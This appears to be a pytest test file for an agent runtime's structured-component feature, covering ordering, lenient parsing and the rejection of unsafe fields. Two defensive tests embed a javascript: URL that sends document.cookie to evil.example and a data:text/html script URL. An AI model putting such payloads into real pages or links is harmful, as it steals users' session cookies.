"""A Run that answers with something structured rather than only with prose.

The decision to build this at all is argued in
`psych_runtime/core/components.py`: Psych owns the payload and the consumer owns the
drawing, so what these assert is that the *data* reaches the log and the report
intact, in order, and that nothing a renderer must not be handed gets through.

The four properties worth a test each: an agent that asked for the feature has
its components in the log and its report; one that did not sees no extra tool;
enabling it moves the Version hash; and a malformed or unsafe component costs
the turn nothing, because the answer is the answer and the component was the
garnish.
"""

from __future__ import annotations

import asyncio
from collections.abc import AsyncIterator

import pytest
import pytest_asyncio

import psych_runtime
from psych_runtime.core.components import Card, Carousel, Chart, Detail, Metric, Timeline
from psych_runtime.core.ids import RunId
from psych_runtime.core.records import ComponentShown, TerminalState
from psych_runtime.core.scope import Scope
from psych_runtime.core.version import publish as make_version
from psych_runtime.runtime.execute import Runtime
from psych_runtime.store.memory import InMemoryStore
from psych_runtime.testing.fake_model import FakeModel
from psych_runtime.tools.registry import ToolRegistry

pytestmark = pytest.mark.e2e

SCOPE = Scope(tenant="acme", principal="user-1")

PRODUCT = {
    "kind": "card",
    "title": "Aeron Chair",
    "subtitle": "Herman Miller, size B",
    "image_url": "https://example.com/aeron.jpg",
    "badges": ["In stock", "Free delivery"],
    "fields": [{"label": "Price", "value": "£1,240"}, {"label": "Colour", "value": "Graphite"}],
    "href": "https://example.com/aeron",
}

ORDER = {
    "kind": "detail",
    "title": "Order A1",
    "status": "Shipped",
    "fields": [{"label": "Placed", "value": "3 March"}],
    "total": {"label": "Total", "value": "£1,240"},
}

REVENUE = {
    "kind": "chart",
    "title": "Weekly revenue",
    "mark": "line",
    "x_label": "Week",
    "y_label": "GBP",
    "series": [{"name": "2026", "points": [{"x": "W1", "y": 1200}, {"x": "W2", "y": 1810}]}],
}


def _spec(*, components: bool = True) -> psych_runtime.AgentSpec:
    return psych_runtime.AgentSpec(
        name="shopping",
        instructions="Help the customer choose.",
        model=psych_runtime.ModelRef(model="fake-standard"),
        components_enabled=components,
        limits=psych_runtime.Limits(max_turns=8, deadline_seconds=60),
    )


@pytest_asyncio.fixture
async def registry() -> AsyncIterator[ToolRegistry]:
    yield ToolRegistry()


async def _run(
    model: FakeModel, registry: ToolRegistry, spec: psych_runtime.AgentSpec
) -> tuple[InMemoryStore, RunId]:
    store = InMemoryStore()
    version = await psych_runtime.publish(store, spec)
    runtime = Runtime(store=store, model=model, registry=registry)
    worker = psych_runtime.Worker(store, runtime, poll_interval=0.01, supervisor_interval=0.05)
    task = asyncio.create_task(worker.run())
    try:
        run = await psych_runtime.dispatch(
            store, version.hash, SCOPE, input={"message": "find me a chair"}
        )
        async for _ in psych_runtime.stream(store, run.run_id):
            pass
    finally:
        worker.stop()
        await asyncio.wait_for(task, timeout=10)
    return store, run.run_id


class TestShowingSomething:
    async def test_the_report_carries_what_was_shown(self, registry: ToolRegistry) -> None:
        model = (
            FakeModel()
            .turn(tool_calls=[("show_component", {"component": PRODUCT})])
            .turn(text="This one fits your budget.")
        )
        store, run_id = await _run(model, registry, _spec())

        report = await psych_runtime.report(store, run_id)
        assert report.terminal_state is TerminalState.COMPLETED
        assert len(report.components) == 1
        card = report.components[0]
        assert isinstance(card, Card)
        assert card.title == "Aeron Chair"
        assert card.badges == ("In stock", "Free delivery")
        assert card.fields[0].value == "£1,240"

    async def test_several_components_accumulate_in_the_order_they_were_shown(
        self, registry: ToolRegistry
    ) -> None:
        """The one way this differs from the plan beside it. An agent that
        showed the order and then the chart showed both, and "order, then
        chart" is part of the answer."""
        model = (
            FakeModel()
            .turn(tool_calls=[("show_component", {"component": ORDER})])
            .turn(tool_calls=[("show_component", {"component": REVENUE})])
            .turn(text="Shipped on the third.")
        )
        store, run_id = await _run(model, registry, _spec())

        report = await psych_runtime.report(store, run_id)
        assert [component.kind for component in report.components] == ["detail", "chart"]
        detail, chart = report.components
        assert isinstance(detail, Detail)
        assert isinstance(chart, Chart)
        assert detail.total is not None
        assert detail.total.value == "£1,240"
        assert chart.mark == "line"
        assert [point.y for point in chart.series[0].points] == [1200.0, 1810.0]

    async def test_the_status_shows_them_while_the_run_is_still_working(
        self, registry: ToolRegistry
    ) -> None:
        """A card produced on turn two should appear on turn two. The report is
        for afterwards; the status is what a console reads while it waits."""
        model = (
            FakeModel()
            .turn(tool_calls=[("show_component", {"component": PRODUCT})])
            .turn(text="Here you go.")
        )
        store, run_id = await _run(model, registry, _spec())

        status = await psych_runtime.status(store, run_id)
        assert [component.kind for component in status.components] == ["card"]

    async def test_every_kind_survives_the_round_trip(self, registry: ToolRegistry) -> None:
        """The vocabulary is closed, so the whole of it is worth one pass: a
        kind that cannot be stored and read back is a kind nobody can use."""
        carousel = {
            "kind": "carousel",
            "title": "Three chairs",
            "cards": [PRODUCT, {"kind": "card", "title": "Embody"}],
        }
        timeline = {
            "kind": "timeline",
            "title": "Delivery",
            "steps": [
                {"label": "Packed", "at": "Mon", "state": "done"},
                {"label": "In transit", "at": "Tue", "state": "current"},
                {"label": "Delivered", "at": "Wed"},
            ],
        }
        metric = {
            "kind": "metric",
            "label": "Spend this month",
            "value": 1240.0,
            "unit": "GBP",
            "delta": "+12%",
            "direction": "up",
        }
        model = (
            FakeModel()
            .turn(tool_calls=[("show_component", {"component": PRODUCT})])
            .turn(tool_calls=[("show_component", {"component": carousel})])
            .turn(tool_calls=[("show_component", {"component": ORDER})])
            .turn(tool_calls=[("show_component", {"component": timeline})])
            .turn(tool_calls=[("show_component", {"component": REVENUE})])
            .turn(tool_calls=[("show_component", {"component": metric})])
            .turn(text="All six.")
        )
        store, run_id = await _run(model, registry, _spec())

        report = await psych_runtime.report(store, run_id)
        assert [component.kind for component in report.components] == [
            "card",
            "carousel",
            "detail",
            "timeline",
            "chart",
            "metric",
        ]
        carousel_shown, timeline_shown, metric_shown = (
            report.components[1],
            report.components[3],
            report.components[5],
        )
        assert isinstance(carousel_shown, Carousel)
        assert len(carousel_shown.cards) == 2
        assert isinstance(timeline_shown, Timeline)
        assert [step.state for step in timeline_shown.steps] == ["done", "current", "upcoming"]
        assert isinstance(metric_shown, Metric)
        assert metric_shown.value == 1240.0

    async def test_it_lands_in_the_log_beside_the_turn_that_showed_it(
        self, registry: ToolRegistry
    ) -> None:
        """No store, no second source of truth: a component is Records, folded
        by the reducer like everything else."""
        model = (
            FakeModel()
            .turn(tool_calls=[("show_component", {"component": PRODUCT})])
            .turn(text="Done.")
        )
        store, run_id = await _run(model, registry, _spec())

        log = await psych_runtime.records(store, run_id)
        written = [record for record in log if isinstance(record, ComponentShown)]
        assert len(written) == 1
        assert isinstance(written[0].component, Card)
        # Appended by the tool body, so it sits between its own start and
        # finish records rather than at the end of the turn.
        types = [type(record).__name__ for record in log]
        start = types.index("ToolCallStarted")
        assert types[start + 1] == "ComponentShown"


class TestLenience:
    async def test_camel_case_and_loose_shapes_are_accepted(self, registry: ToolRegistry) -> None:
        """`imageUrl` and a bare `[x, y]` pair are what a model reaches for
        when it is thinking about the data rather than about this schema, and
        both say something unambiguous."""
        loose = {
            "type": "chart",
            "title": "Sales",
            "chartType": "BAR",
            "xLabel": "Quarter",
            "yLabel": "Units",
            "series": [{"name": "2026", "points": [["Q1", 4], ["Q2", 9]]}],
        }
        model = (
            FakeModel()
            .turn(tool_calls=[("show_component", {"component": loose})])
            .turn(text="Up nine.")
        )
        store, run_id = await _run(model, registry, _spec())

        report = await psych_runtime.report(store, run_id)
        chart = report.components[0]
        assert isinstance(chart, Chart)
        assert chart.mark == "bar"
        assert chart.x_label == "Quarter"
        assert [(point.x, point.y) for point in chart.series[0].points] == [
            ("Q1", 4.0),
            ("Q2", 9.0),
        ]

    async def test_a_malformed_component_costs_the_turn_nothing(
        self, registry: ToolRegistry
    ) -> None:
        """The component was the garnish; the answer is the answer. A Run that
        found the right thing to say should not fail because the model got a
        field name wrong on the way to saying it."""
        model = (
            FakeModel()
            .turn(tool_calls=[("show_component", {"component": {"kind": "sculpture"}})])
            .turn(text="It is out of stock, sorry.")
        )
        store, run_id = await _run(model, registry, _spec())

        report = await psych_runtime.report(store, run_id)
        assert report.terminal_state is TerminalState.COMPLETED
        assert report.components == ()
        # And the model was told what was wrong, so it can try again rather
        # than repeat itself.
        call = next(item for item in report.tool_calls if item.tool == "show_component")
        assert call.outcome is not None
        assert call.outcome.value == "ok"

        answer = await psych_runtime.answer(store, run_id)
        assert "out of stock" in answer.text


class TestWhatARendererMayBeHanded:
    async def test_a_javascript_url_is_refused_and_nothing_is_shown(
        self, registry: ToolRegistry
    ) -> None:
        """The whole safety story in one case. A renderer that puts a
        model-authored string into `href` has handed the model a script, so the
        component is refused rather than quietly stripped: silently dropping
        the bad URL and showing the card anyway would teach the model that
        `javascript:` links are fine and merely ineffective."""
        hostile = dict(PRODUCT, href="javascript:fetch('//evil.example/'+document.cookie)")
        model = (
            FakeModel()
            .turn(tool_calls=[("show_component", {"component": hostile})])
            .turn(text="Here is the chair.")
        )
        store, run_id = await _run(model, registry, _spec())

        report = await psych_runtime.report(store, run_id)
        assert report.components == ()
        log = await psych_runtime.records(store, run_id)
        assert not [record for record in log if isinstance(record, ComponentShown)]

    async def test_a_data_url_image_is_refused_too(self, registry: ToolRegistry) -> None:
        """`data:` is content the consumer never fetched and cannot attribute,
        and `data:text/html` is a page."""
        hostile = dict(PRODUCT, image_url="data:text/html;base64,PHNjcmlwdD4=")
        model = (
            FakeModel()
            .turn(tool_calls=[("show_component", {"component": hostile})])
            .turn(text="Here is the chair.")
        )
        store, run_id = await _run(model, registry, _spec())

        report = await psych_runtime.report(store, run_id)
        assert report.components == ()


class TestWhoIsOfferedIt:
    async def test_an_agent_that_did_not_ask_for_it_is_not_offered_it(
        self, registry: ToolRegistry
    ) -> None:
        """Off by default, and the cost of being wrong about that is a long
        vocabulary in the prompt of every Run that will only ever answer in a
        sentence."""
        model = FakeModel().turn(text="Done.")
        await _run(model, registry, _spec(components=False))

        offered = {tool.name for tool in model.requests[0].tools}
        assert "show_component" not in offered

    async def test_enabling_components_moves_the_version_hash(self) -> None:
        """An agent that can answer with a chart is a different agent, and
        every one of its turns is offered a different tool set."""
        assert make_version(_spec(components=False)).hash != make_version(_spec()).hash
